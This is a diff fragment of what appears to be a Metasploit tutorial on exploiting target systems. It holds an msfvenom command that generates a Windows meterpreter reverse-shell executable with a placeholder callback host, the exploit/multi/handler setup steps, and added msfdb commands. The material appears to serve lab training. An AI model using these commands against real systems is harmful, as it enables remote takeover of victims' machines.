@@ -13,12 +13,16 @@ Here, we will see how attackers can exploit vulnerabilities in target systems to
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /root/Desktop/Test.exe
 ```
 
+
+msfdb init && msfconsole
+msfdb status
+
+
+
+
 > LHOST Corresponde al IP REMOTA donde se va contectar la shell reversa
 
-
-
 Type msfconsole and press Enter to launch the Metasploit framework.
-
 In msfconsole, type use exploit/multi/handler and press Enter.
 
 
